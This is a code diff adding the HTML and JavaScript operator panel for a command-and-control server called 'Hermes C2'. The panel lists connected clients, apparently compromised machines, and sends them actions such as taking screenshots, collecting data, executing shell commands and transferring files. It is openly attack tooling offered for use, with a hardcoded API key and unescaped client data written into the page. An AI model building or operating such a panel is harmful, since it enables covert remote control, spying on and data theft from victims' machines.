@@ -1,0 +1,383 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Hermes C2 Control Panel</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #1e1e1e;
+            color: #f0f0f0;
+        }
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        header {
+            background-color: #333;
+            padding: 20px;
+            text-align: center;
+            border-bottom: 3px solid #007acc;
+        }
+        h1 {
+            margin: 0;
+            color: #007acc;
+        }
+        .status-bar {
+            background-color: #252525;
+            padding: 10px;
+            margin: 20px 0;
+            border-radius: 5px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .status-indicator {
+            display: inline-block;
+            width: 12px;
+            height: 12px;
+            border-radius: 50%;
+            margin-right: 5px;
+        }
+        .status-online {
+            background-color: #4caf50;
+        }
+        .status-offline {
+            background-color: #f44336;
+        }
+        .panel {
+            background-color: #252525;
+            border-radius: 5px;
+            padding: 20px;
+            margin-bottom: 20px;
+        }
+        .panel h2 {
+            margin-top: 0;
+            color: #007acc;
+            border-bottom: 1px solid #444;
+            padding-bottom: 10px;
+        }
+        .grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 20px;
+        }
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin-top: 10px;
+        }
+        th, td {
+            padding: 12px;
+            text-align: left;
+            border-bottom: 1px solid #444;
+        }
+        th {
+            background-color: #333;
+            color: #007acc;
+        }
+        tr:hover {
+            background-color: #2a2a2a;
+        }
+        input, select, textarea {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 10px;
+            border-radius: 5px;
+            border: 1px solid #444;
+            background-color: #333;
+            color: #f0f0f0;
+        }
+        button {
+            background-color: #007acc;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-weight: bold;
+        }
+        button:hover {
+            background-color: #005999;
+        }
+        .log {
+            background-color: #1a1a1a;
+            padding: 10px;
+            border-radius: 5px;
+            height: 200px;
+            overflow-y: auto;
+            font-family: monospace;
+            margin-top: 10px;
+        }
+        .log-entry {
+            margin-bottom: 5px;
+            border-bottom: 1px solid #333;
+            padding-bottom: 5px;
+        }
+        .timestamp {
+            color: #007acc;
+        }
+        .success {
+            color: #4caf50;
+        }
+        .error {
+            color: #f44336;
+        }
+        .info {
+            color: #ffeb3b;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <h1>Hermes C2 Control Panel</h1>
+    </header>
+    
+    <div class="container">
+        <div class="status-bar">
+            <div>
+                <span class="status-indicator" id="server-status"></span>
+                <span id="status-text">Checking server status...</span>
+            </div>
+            <div>
+                <span id="client-count">0</span> clients connected
+            </div>
+        </div>
+        
+        <div class="grid">
+            <div class="panel">
+                <h2>Connected Clients</h2>
+                <table id="clients-table">
+                    <thead>
+                        <tr>
+                            <th>ID</th>
+                            <th>Address</th>
+                            <th>Status</th>
+                            <th>Actions</th>
+                        </tr>
+                    </thead>
+                    <tbody id="clients-list">
+                        <!-- Client rows will be added here -->
+                    </tbody>
+                </table>
+            </div>
+            
+            <div class="panel">
+                <h2>Send Command</h2>
+                <form id="command-form">
+                    <label for="target">Target:</label>
+                    <select id="target" name="target">
+                        <option value="all">All Clients</option>
+                        <!-- Individual clients will be added here -->
+                    </select>
+                    
+                    <label for="action">Action:</label>
+                    <select id="action" name="action">
+                        <option value="TAKE_SCREENSHOT">Take Screenshot</option>
+                        <option value="COLLECT_DATA">Collect Data</option>
+                        <option value="EXECUTE_SHELL">Execute Shell Command</option>
+                        <option value="DOWNLOAD_FILE">Download File</option>
+                        <option value="UPLOAD_FILE">Upload File</option>
+                    </select>
+                    
+                    <label for="payload">Payload:</label>
+                    <textarea id="payload" name="payload" rows="4" placeholder="Command parameters in key=value format"></textarea>
+                    
+                    <button type="submit">Send Command</button>
+                </form>
+            </div>
+        </div>
+        
+        <div class="panel">
+            <h2>Command Log</h2>
+            <div class="log" id="command-log">
+                <!-- Log entries will be added here -->
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // API Key for authentication
+        const API_KEY = 'test-api-key';
+        
+        // Server URL
+        const SERVER_URL = window.location.protocol + '//' + window.location.host;
+        
+        // DOM Elements
+        const serverStatus = document.getElementById('server-status');
+        const statusText = document.getElementById('status-text');
+        const clientCount = document.getElementById('client-count');
+        const clientsList = document.getElementById('clients-list');
+        const targetSelect = document.getElementById('target');
+        const commandForm = document.getElementById('command-form');
+        const commandLog = document.getElementById('command-log');
+        
+        // Check server status
+        async function checkServerStatus() {
+            try {
+                const response = await fetch(`${SERVER_URL}/status`);
+                const data = await response.json();
+                
+                if (data.status === 'online') {
+                    serverStatus.className = 'status-indicator status-online';
+                    statusText.textContent = `Server Online (v${data.version})`;
+                    return true;
+                } else {
+                    serverStatus.className = 'status-indicator status-offline';
+                    statusText.textContent = 'Server Offline';
+                    return false;
+                }
+            } catch (error) {
+                serverStatus.className = 'status-indicator status-offline';
+                statusText.textContent = 'Server Unreachable';
+                logMessage('Error connecting to server: ' + error.message, 'error');
+                return false;
+            }
+        }
+        
+        // Get connected clients
+        async function getClients() {
+            try {
+                const response = await fetch(`${SERVER_URL}/api/clients`, {
+                    headers: {
+                        'X-API-Key': API_KEY
+                    }
+                });
+                
+                if (!response.ok) {
+                    throw new Error(`HTTP error ${response.status}`);
+                }
+                
+                const data = await response.json();
+                updateClientsList(data.clients);
+                clientCount.textContent = data.total;
+                return data.clients;
+            } catch (error) {
+                logMessage('Error fetching clients: ' + error.message, 'error');
+                return [];
+            }
+        }
+        
+        // Update clients list in the table and dropdown
+        function updateClientsList(clients) {
+            // Clear existing entries
+            clientsList.innerHTML = '';
+            
+            // Keep 'All Clients' option and remove the rest
+            while (targetSelect.options.length > 1) {
+                targetSelect.remove(1);
+            }
+            
+            if (clients.length === 0) {
+                const row = document.createElement('tr');
+                row.innerHTML = '<td colspan="4">No clients connected</td>';
+                clientsList.appendChild(row);
+            } else {
+                clients.forEach(client => {
+                    // Add to table
+                    const row = document.createElement('tr');
+                    row.innerHTML = `
+                        <td>${client.id}</td>
+                        <td>${client.address}</td>
+                        <td>${client.connected ? 'Connected' : 'Disconnected'}</td>
+                        <td>
+                            <button onclick="sendCommandToClient('${client.id}', 'PING', '')">Ping</button>
+                        </td>
+                    `;
+                    clientsList.appendChild(row);
+                    
+                    // Add to dropdown
+                    const option = document.createElement('option');
+                    option.value = client.id;
+                    option.textContent = client.id;
+                    targetSelect.appendChild(option);
+                });
+            }
+        }
+        
+        // Send command to client(s)
+        async function sendCommand(targetId, action, payload) {
+            try {
+                const response = await fetch(`${SERVER_URL}/api/command`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'X-API-Key': API_KEY
+                    },
+                    body: JSON.stringify({
+                        target_id: targetId,
+                        action: action,
+                        payload: payload
+                    })
+                });
+                
+                const data = await response.json();
+                
+                if (response.ok) {
+                    logMessage(`Command sent: ${action} to ${targetId}`, 'success');
+                    logMessage(`Server response: ${data.status}`, 'info');
+                    return true;
+                } else {
+                    logMessage(`Error sending command: ${data.error}`, 'error');
+                    return false;
+                }
+            } catch (error) {
+                logMessage('Error sending command: ' + error.message, 'error');
+                return false;
+            }
+        }
+        
+        // Helper function to send command to a specific client
+        function sendCommandToClient(clientId, action, payload) {
+            sendCommand(clientId, action, payload);
+        }
+        
+        // Add log message
+        function logMessage(message, type = 'info') {
+            const entry = document.createElement('div');
+            entry.className = `log-entry ${type}`;
+            
+            const timestamp = new Date().toLocaleTimeString();
+            entry.innerHTML = `<span class="timestamp">[${timestamp}]</span> ${message}`;
+            
+            commandLog.appendChild(entry);
+            commandLog.scrollTop = commandLog.scrollHeight;
+        }
+        
+        // Initialize
+        async function initialize() {
+            const isOnline = await checkServerStatus();
+            if (isOnline) {
+                await getClients();
+                logMessage('Connected to C2 server', 'success');
+            }
+        }
+        
+        // Event listeners
+        commandForm.addEventListener('submit', async (e) => {
+            e.preventDefault();
+            
+            const targetId = targetSelect.value;
+            const action = document.getElementById('action').value;
+            const payload = document.getElementById('payload').value;
+            
+            await sendCommand(targetId, action, payload);
+        });
+        
+        // Refresh data periodically
+        setInterval(async () => {
+            const isOnline = await checkServerStatus();
+            if (isOnline) {
+                await getClients();
+            }
+        }, 5000);
+        
+        // Initialize on page load
+        initialize();
+    </script>
+</body>
+</html>
